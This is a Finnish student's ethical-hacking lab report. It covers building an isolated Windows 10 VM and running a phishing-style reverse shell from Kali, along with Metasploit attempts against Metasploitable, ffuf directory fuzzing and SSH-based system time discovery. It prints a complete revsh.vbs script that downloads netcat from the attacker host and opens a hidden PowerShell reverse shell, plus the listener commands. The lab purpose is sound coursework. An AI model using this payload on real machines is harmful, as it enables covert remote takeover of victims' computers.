#### Alisa Ahokas

Aloitetaan üìÜ 01.12.2023 üïê 15.20 lukemalla [teht√§v√§nanto](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h6-attaaack)

# h6 Attaaack

## a) The OS pwns you.
Aloitin lataamalla [Windows 10](https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise). Valitsin English (Great Britain) ISO ‚Äì Enterprise downloads 64-bit editionin.

Lataaminen kesti kauan. L√§hdin kulkemaan [Installing Windows 10 on a virtual machine ohjeiden](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/windows.md) mukaan eteenp√§in.

Aloitin nime√§m√§ll√§ koneen ja lis√§√§m√§ll√§ 4 CPU:ta ja muistia sek√§ virtuaalisen kovalevyn

![0](https://github.com/Viktorialissa/PenTest/assets/112398757/a5692a32-1682-4631-aec1-39378abab0b8)

![2](https://github.com/Viktorialissa/PenTest/assets/112398757/05993f29-1131-4775-ae05-3339ce731613)

![3](https://github.com/Viktorialissa/PenTest/assets/112398757/689a5b52-2f1d-4853-ac47-3a8acbe8b2ac)

En asentanut ISO-kuvaketta alkuun, kuten ohjeissa annettiin ymm√§rt√§√§ vaan lis√§√§n sen nyt.

![6](https://github.com/Viktorialissa/PenTest/assets/112398757/65f66d92-8e67-4cd9-9ba4-3581ef5c35f0)

Sain seuraavaksi t√§llaisen ilmoituksen:

![7](https://github.com/Viktorialissa/PenTest/assets/112398757/18212588-0d2a-4bac-80e1-4ef884b9592a)

Sitten t√§m√§nlaisen:

![8](https://github.com/Viktorialissa/PenTest/assets/112398757/f8540891-8f47-4579-b2b4-7a4e8dce183c)

Yritin s√§√§t√§√§ muistia lis√§√§ astuksista, mutta ei vaikuta kovin hyv√§lt√§ tilanteelta.

![10](https://github.com/Viktorialissa/PenTest/assets/112398757/ee51f3b2-f4f7-4463-9259-e7c9949b9267)

Ei l√§htenyt kone toimimaan. Yritet√§√§n nyt laittaa ISO-kuva jo aikaisemmin:

![11](https://github.com/Viktorialissa/PenTest/assets/112398757/38350ba1-e579-40d3-bb3f-efc58941517c)

Tehd√§√§n asetukset:

![12](https://github.com/Viktorialissa/PenTest/assets/112398757/8810df02-8412-4596-a6eb-fe3f157509ff)


![13](https://github.com/Viktorialissa/PenTest/assets/112398757/fa170460-8b5e-490a-b9fc-157e9f0f6b7a)

![14](https://github.com/Viktorialissa/PenTest/assets/112398757/3439d84b-ae2c-482d-8d93-2f1a58933554)

Seuraavaksi tuli taas t√§llaiset varoitukset:

![15](https://github.com/Viktorialissa/PenTest/assets/112398757/97eea1fc-9d7c-4990-b7e0-d5a17c90ac7e)

nyt kone l√§hti jollain tavalla k√§yntiin:

![16](https://github.com/Viktorialissa/PenTest/assets/112398757/d47988be-c9e8-43f7-8a68-e17b00166581)

Sitten sain t√§llaisen viestin:

![17](https://github.com/Viktorialissa/PenTest/assets/112398757/b21f358b-4845-4c29-afea-4dcda3a765c6)

Yritin poistaa ja luoda uuden koneen ja sain t√§llaisen ilmoituksen:

![18](https://github.com/Viktorialissa/PenTest/assets/112398757/9fffe697-1c73-4798-985b-2d3348280ec1)

Menen omaan hakemistooni poistamaan tiedoston manuaalisesti kuvan osoittmasta polusta:

![19](https://github.com/Viktorialissa/PenTest/assets/112398757/985097f6-ae75-4145-87e9-ff4baf7173cf)

Jouduin monta kertaa (yli 10 mutta v√§hemm√§n kuin 20 kertaa) poistamaan virtuaalikoneen ja luomaan sen uudelleen erin√§isten ihmeellisten syiden takia. Ensinn√§kin en voinut laittaa niin paljon muistia koneelle kun oli suositeltavaa ja t√§m√§ aiheutti h√§ss√§kk√§√§ paljon. Yritin monesti olla lis√§√§m√§tt√§ muistia liikaa ja v√§lill√§ juuri sille limitille, ett√§ vihre√§n ja punaisen v√§lill√§ on se osoitin.

Erroreita vilisee silmiss√§ ja kone ei k√§ynnisty. Lopulta muutaman tunnin sinnikk√§√§n asentamisen ja poistamisen j√§lkeen asenus onnistui. Asensin koneen default-asetuksilla paitsi CPU:n m√§√§r√§ oli ainoa, jota kasvatin suositeltuun nelj√§√§n.

Nyt kone alkoi toimimaan ja seurasin ohjeita eteenp√§in asentaen kielen, n√§pp√§imist√∂n, k√§ytt√§j√§n jne.

![20 0](https://github.com/Viktorialissa/PenTest/assets/112398757/1afd6df2-c74f-4bf4-84a4-7bc70fb69e98)

![21](https://github.com/Viktorialissa/PenTest/assets/112398757/24ef8d6b-367e-4adb-a4a0-1152d3c1e286)

![22](https://github.com/Viktorialissa/PenTest/assets/112398757/a40a10ed-5767-4ed4-97b2-93229b958c2c)

![23](https://github.com/Viktorialissa/PenTest/assets/112398757/4f97b207-0a63-4bf9-8006-09579b3f9f46)

Valitaan vasemmasta alalaidasta "Domain join instead" ja painetaan next.

![24](https://github.com/Viktorialissa/PenTest/assets/112398757/acee2098-fff0-40c6-8cbd-6c9b3f107455)

Lis√§t√§√§n k√§ytt√§j√§nimi:

![25](https://github.com/Viktorialissa/PenTest/assets/112398757/3417de29-b565-4e3b-ac18-1bd5b8356a2f)

Lis√§t√§√§n vahva salasana:

![26](https://github.com/Viktorialissa/PenTest/assets/112398757/137ae157-0ed6-4630-ace2-e60184a41fd1)

Alkaa n√§ytt√§√§ lupaavalta:

![27](https://github.com/Viktorialissa/PenTest/assets/112398757/289397b4-2d65-426b-834b-8900616efd21)

Ja vihdoin kone aukeaa:

![28 0](https://github.com/Viktorialissa/PenTest/assets/112398757/1f11ae6d-d669-453e-995d-3ebbb1a798c5)


Lopulta asetin windows 10 virtuaalikoneelle samanlaisen host-only yhteyden kuin olin tehnyt kalin ja metasploitablen v√§lille.

Avataan koneesta Settings ja menn√§√§n Network v√§lilehdelle, josta valitaan Adapter 2 ja laitetaan sinne Host-only Adapter.

![29](https://github.com/Viktorialissa/PenTest/assets/112398757/1ec57bb4-dcc2-4760-8ac9-66f91ca95d2e)

Avataan Command Prompt ja laitetaan komento:

    ipconfig

N√§hd√§√§n adapteri 1 ja adapteri 2 erot.

![30](https://github.com/Viktorialissa/PenTest/assets/112398757/cb7efb51-69db-425b-b40b-4fd8888837ca)

Laitetaan windowsista netti kiinni:

![31](https://github.com/Viktorialissa/PenTest/assets/112398757/d3373b35-b627-47c6-97c7-b9b56261d1ed)

![32](https://github.com/Viktorialissa/PenTest/assets/112398757/66e29866-1918-46bc-ad24-5740daded162)

![33](https://github.com/Viktorialissa/PenTest/assets/112398757/11b0a316-ebc1-48be-a26e-db4e1837eae9)

Pingataan Windowsilla Kalia onnistuneesti:

![34](https://github.com/Viktorialissa/PenTest/assets/112398757/a147946b-6dc1-40db-9914-ba4765555383)

Pingataan 8.8.8.8 joka ei mene l√§pi:

![35](https://github.com/Viktorialissa/PenTest/assets/112398757/802bf74b-5136-4918-a81f-fc342296b7b5)


Yritet√§√§n pingata Kalista Windowsia, mutta Windowsin palomuuri est√§√§ pingaamisen.

![36 0](https://github.com/Viktorialissa/PenTest/assets/112398757/69f97abd-9057-4ef3-aa3b-5ab4dc7272d9)


## b) Trustme.lnk.

Aloitetaan tekeminen üìÜ 01.12.2023 üïê 18.00.

Luen monta kertaa [README.md](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell/README.md) tiedoston ja katson monta kertaa videon, joka linkattu repossa https://www.youtube.com/watch?v=ll4ojo6q-rM.

Aloitan avaamalla Kalissa selaimen ja haen sielt√§ reposta ``nc64.exe`` tiedoston. Luon Kaliin uuden hakemiston nimell√§ phishsticks. Siirr√§n ladatun exe tiedoston sinne ja luon samalla ``raport.txt`` tiedoston, johon kijoitan haluamani tekstin.

Minulla ei ole USB-tikkua, joten avaan Windows 10 virtuaalikoneeni ja luon sinne kansion nimelt√§ payload sek√§ ``revsh.vbs`` tiedoston sek√§ ``moi.txt`` (sinne haluamani tekstin) tiedoston (n√§iden piti tulla USB-tikun kautta).

``Revsh.vbs`` tiedoston sis√§lt√∂ tuli my√∂s kopioitua reposta. Vaihdoin siihen oman Kalini ip-osoitteen. Sen olin aiemmin saanut selville asentaessani Windowsia ja pingatessa.

revsh.vbs tiedoston sis√§lt√∂:

```
Set objShell = CreateObject("Wscript.Shell")

' Download fake report
downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.101/raport.txt', '%TEMP%\raport.txt')"""
objShell.Run downloadRaport, 0, True

' Open report.txt
objShell.Run "cmd /c start """" %TEMP%\raport.txt", 0, True

' Download netcat from attacker IP
downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.101/nc64.exe', '%TEMP%\nc64.exe')"""
objShell.Run downloadCmd, 0, True

' Start reverse shell
execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.101', '9001', '-e', 'powershell' -WindowStyle Hidden"""
objShell.Run execCmd, 0, True

Set objShell = Nothing
```

Nyt windows ty√∂p√∂yd√§ll√§ni on kansio, jossa on kaksi tiedostoa ``moi.txt`` sek√§ ``revsh.vbs``. Varmistan viel√§, ett√§ netti on pois p√§√§lt√§.

T√§m√§n j√§lkeen siirryn taisin Kalin pariin ja avaan terminaalin. Varmistan, ett√§ netti on pois p√§√§lt√§ pingill√§. Siirryn kansioon phishsticks ja katsoin, ett√§ siell√§ on vaadittavat tiedostot eli ``raport.txt`` ja ``nc64.exe``. Sitten ajoin komennon:

python3 -m http.server 80

Avasin toisen terminaalin ja kirjoitin komennon:

    nc -lvnp 9001

T√§m√§n j√§lkeen avasin ``revsh.vbs`` tiedoston suoraan windows koneelta, koska en tehnyt mit√§√§n hienoa shortcut tiedostoa. Nyt yhteys aukesi ja sain shellin auki Kalissa. L√§hdin kirjoittelemaan erilaisia komentoja avaten tiedostoja sek√§ luoden uusia kansioita ett√§ tiedostoja niihin.

![37](https://github.com/Viktorialissa/PenTest/assets/112398757/8a4710ff-bf58-4506-91ce-d8516d371043)


``Revsh.vbs`` tiedosto on scriptitiedosto, joka lataa Kalista ``raport.txt`` tiedoston k√§ytt√§en ip-osoitetta, joka on Kalin. Sitten raportti ajetaan ja netcat ladataan hy√∂kk√§√§j√§n ip-osoitetta k√§ytt√§en eli ajetaan ``nc64.exe`` tiedosto, jonka j√§lkeen k√§ynnistet√§√§n reverse shell ja t√§m√§ mahdollistaa minun tehd√§ hy√∂kk√§√§j√§n koneeltani tiedostoja ja tutkia niiden sis√§lt√∂√§ hy√∂k√§tyn koneelle.

T√§ss√§ kuvasarjassa on lis√§tekeleet windowsiin kalin kautta k√§ytt√§en reverse shelli√§:

![38](https://github.com/Viktorialissa/PenTest/assets/112398757/d2187986-4fd5-4603-bb58-f60fa5e88fb6)

![39](https://github.com/Viktorialissa/PenTest/assets/112398757/fa3660bf-3d23-428a-b443-ca1644a96233)

![40](https://github.com/Viktorialissa/PenTest/assets/112398757/23b464c9-2982-445e-87b5-44cf8a972bb2)

![41](https://github.com/Viktorialissa/PenTest/assets/112398757/05f9abc3-623d-4ce2-9e96-2487202bbe68)

![42](https://github.com/Viktorialissa/PenTest/assets/112398757/61302d2c-2347-43ff-a2ec-c4344def53c7)

![43](https://github.com/Viktorialissa/PenTest/assets/112398757/8f3f59fa-71e1-468f-bcd0-81565221647b)

![44](https://github.com/Viktorialissa/PenTest/assets/112398757/dbca618d-34e0-4201-990f-ddf163e38bb0)

![45](https://github.com/Viktorialissa/PenTest/assets/112398757/d3cea7fa-4db2-4d76-beb5-e9e3910bca71)

![46](https://github.com/Viktorialissa/PenTest/assets/112398757/9fef4103-96dc-4570-95ce-892491e43d7e)

> Lopetetaan kirjoittaminen üìÜ 01.12.2023. üïê 19.50.

## c) Attaaack!

Aloitetaan üìÜ 02.12.2023 üïê 13.00 lukemalla sivustoa.

#### Initial Access

Valitaan taktiikaksi Initial Access ja tekniikaksi Valid Accounts.
Aloitetaan tekem√§ll√§ [T1078.001](https://attack.mitre.org/techniques/T1078/001/). Yritet√§√§n hankkia tai hy√∂dynt√§√§ oletustilin k√§ytt√§j√§tietoja ja laajentaa oikeuksia tms.

Avaan Kalin ja Metasploitable 2. Varmistan, ett√§ niiden v√§linen yhteys pelaa pingaamalla ja varmistan, ett√§ Kali on irti netist√§ pingaamalla ping 1.1.1.1.


![47 0](https://github.com/Viktorialissa/PenTest/assets/112398757/ca01c4ce-d071-40c4-9d71-4c8a551ff15a)

![48](https://github.com/Viktorialissa/PenTest/assets/112398757/a0b8bf8c-3362-4c8c-aed0-16bb3a0a1a5b)


Aloitan kirjoittamalla Kalin terminaaliin komennon:

    msfconsole

T√§m√§ avaa metasploitable frameworkin consolen.

H√§mment√§v√§n hauska yksityiskohta

![49](https://github.com/Viktorialissa/PenTest/assets/112398757/e11446a8-be28-4f62-8a3d-aa77bd4474bb)


Yritin kirjautua sis√§√§n, mutta se ei onnistunut. Tarkistin ssh-yhteyden Kalista ja se oli p√§√§ll√§, mutta sen tarkistaminen metasploitable 2 ei onnistunut.

![50](https://github.com/Viktorialissa/PenTest/assets/112398757/3cb09902-76c3-4f5e-9eaf-02df1133b197)

Olin kyll√§ siin√§ k√§sityksess√§, ett√§ ssh:n pit√§isi olla Metasploitable 2:ssa. Muistan aiemmin lukeneeni, ett√§ set USERNAME ja set PASSWORD voidaan laittaa set RHOSTS j√§lkeen, mutta t√§m√§ ei nyt jostain syyst√§ toiminut. L√∂ysin [artikkelin](https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits) ja kokeilen sen mukaan ssh-loginia.

![52](https://github.com/Viktorialissa/PenTest/assets/112398757/01007a66-995d-49be-b6fd-a286d869c2e6)

T√§ss√§ tein ohjeiden mukaan ja ei l√§htenyt toimimaan. En osaa sanoa miksi. Halusin testata ssh_login tyylist√§ l√§hestymistapaa, mutta en p√§√§ssyt t√§h√§n ihan k√§rryille.

#### Defense Evasion

Valitaan taktiikaksi Defense Evasion ja tekniikaksi [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211/) t√§ss√§ hy√∂dynnet√§√§n j√§rjestelm√§n tai sovelluksen haavoittuvuutta, jotta voidaan ohittaa turvaominaisuudet. T√§llaisen haavoittuvuuden hy√∂dynt√§minen tapahtuu hy√∂dynt√§ess√§ ohjelmointivirhett√§ esim. k√§ytt√∂j√§rjestelm√§ss√§ tai ohjelmassa.

L√∂ysin [artikkelin](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/ms10_015_kitrap0d) ja kokeilen sen perusteella. En l√∂yd√§ lopulta sessiolle id-numeroa ja homma ei kulje. Noh mielenkiintoinen kokeilu.

![53](https://github.com/Viktorialissa/PenTest/assets/112398757/148eb529-2b29-4a0c-bb64-c7b7cff1e33e)

N√§m√§ kokeiluni eiv√§t ole oikein onnistuneet, joten yrit√§n tehd√§ nyt fuzzauksen, jota olemme harjoitelleet aikaisemmin kurssilla.

#### Reconnaissance

Taktiikka on Reconnaissance ja tekniikkana on Active Scanning. 
[Active Scanning: Wordlist Scanning T1595.003](https://attack.mitre.org/techniques/T1595/003/) tarkoitus on skannata ja l√∂yt√§√§ infrastruktuuria ja identifioida sis√§lt√∂√§ pikemminkin kuin l√∂yt√§√§ k√§ytt√§j√§tunnuksia esimerkiksi.

[Kalin dokumentaatiosta](https://www.kali.org/tools/wordlists/) k√§y ilmi, ett√§ sanalistoja on ``/usr/share/wordlist/`` alla. K√§yn ohjeen mukaan ottamassa dirb-hakemistosta jonkun.

![54 0](https://github.com/Viktorialissa/PenTest/assets/112398757/deb10917-d94c-4c56-ab30-917443bbea0a)

Suoritan komennon:

    ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.56.102/FUZZ     

![55](https://github.com/Viktorialissa/PenTest/assets/112398757/8532463d-a598-410d-b9a1-c585fc7d3295)


Vatauksena ``.tpasswd, .hta, .htaccess`` palauttivat 403 eli forbidden, joten niihin ei ole p√§√§sy√§. 301 status tuli ``dav, phpMyAdmin, test ja wiki``. T√§m√§ koodi tulee yleens√§ rerouten yhteydess√§ eli uudelleenohjaus. 200 ok tuli muutamasta eli ``phpinfo.php, index, index.php ja phpinfo``. N√§ihin polkuihin vastaus on 200 ok eli ovat varmaan olemassa.

### Discovery

Voisin kokeilla seuraavaksi uuden virtuaalikoneen eli Windows 10 k√§ytt√§mist√§ kohdekoneena. Taktiikkana on Discovery ja tekniikkana on [System Time Discovery T1124](https://attack.mitre.org/techniques/T1124/). T√§ss√§ yritet√§√§n ker√§t√§ j√§rjestelm√§n ajan ja aikavy√∂hykkeen tietoja koneelta. K√§ytt√§j√§n koneen ajan tiet√§minen voi olla tehokas keino ajoittaa jonkin tiedoston suorittaminen tms.

Avasin Windows 10 koneen ja sain avata sen pari kertaa, koska jo asennusvaiheessa tutut varoitukset piinasivat minua. Nyt kone kuitenkin aukesi ja katson onko OpenSSH Client ja Server asennettu. K√§yt√§n apuna [Microsoftin omaa dokumentaatiota](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=gui). OpenSSH Client oli asennettu, mutta asennan itse OpenSSH Serverin. K√§ynnist√§n OpenSSH Serverin ja laitan netin kiinni kummastakin koneestani.

Seuraavaksi Kalissa laitan komennon:

    ssh <windows ip>

Sen j√§lkeen kysyt√§√§n salasanaa (jonka sattuneesta syyst√§ tied√§n) ja p√§√§sen sis√§√§n. T√§ss√§ voisi olla jokin hieno v√§livaihe, miss√§ on siepattu salasana tms, ett√§ ei ment√§isi suoraan sis√§√§n tiet√§en sit√§.

Nyt yhteys on auki windowsiini ja p√§√§sen tutkimaan aikoja sek√§ p√§iv√§m√§√§r√§√§.

![56 00](https://github.com/Viktorialissa/PenTest/assets/112398757/c4395137-c30c-453b-bae4-db9fa5593b03)


> Lopetan teht√§v√§n tekemisen üìÜ 02.12.2023 üïê 18.10.

> Viimeistelen raportin illan mittaan ja laitan sen githubiin.




## d) PageRank.

Laitetaan oman github [repon url](https://github.com/Viktorialissa/PenTest/tree/main) [kurssisivustolle](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#comments).



> Aloitan viimeistelyn üìÜ 03.12.2023 üïê 00.30.

> Viimeistell√§√§n raportti üìÜ 27.11.2023 üïê 01.20.

## L√§hteet:

- [Alisa Ahokas - H2](https://github.com/Viktorialissa/PenTest/blob/main/h2.md#fuffme).
- [Halonen, Rajala, Ollikainen - Revshell](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/revshell).
- [[Halonen, Rajala, Ollikainen - Installing Windows 10 on a virtual machine](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/windows.md).
- [Kalin dokumentaatiosta](https://www.kali.org/tools/wordlists/)
- [artikkelin](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/ms10_015_kitrap0d)
- [artikkelin](https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits)
- [MITRE Attack - ATT&CK Matrix for Enterprise](https://attack.mitre.org/).
- Tero Karvinen luento 27.11.2023.
- [Tero Karvinen - teht√§v√§](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h6-attaaack).
